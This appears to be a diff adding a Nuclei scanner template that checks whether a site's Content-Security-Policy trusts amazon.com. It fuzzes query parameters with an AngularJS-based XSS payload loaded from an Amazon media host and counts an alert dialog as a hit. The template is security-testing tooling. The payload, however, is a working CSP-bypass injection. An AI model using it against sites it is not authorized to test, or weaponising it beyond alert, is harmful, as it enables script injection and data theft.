@@ -1,0 +1,55 @@
+id: amazon-media-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Amazon Media
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,amazon-media
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "amazon.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: amazon_media_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "amazon_media_csp_xss == true"
+# digest: 4b0a00483046022100f16d4796feb8970b013ba11f1c58b00a9d51725dfce2d525c32695df313d08f9022100c6ccc785abf94a4d63d5e962cbf817f0a0c9a0ffb72a274f3b6cb8592c03c55a:922c64590222798bb761d5b6d8e72950
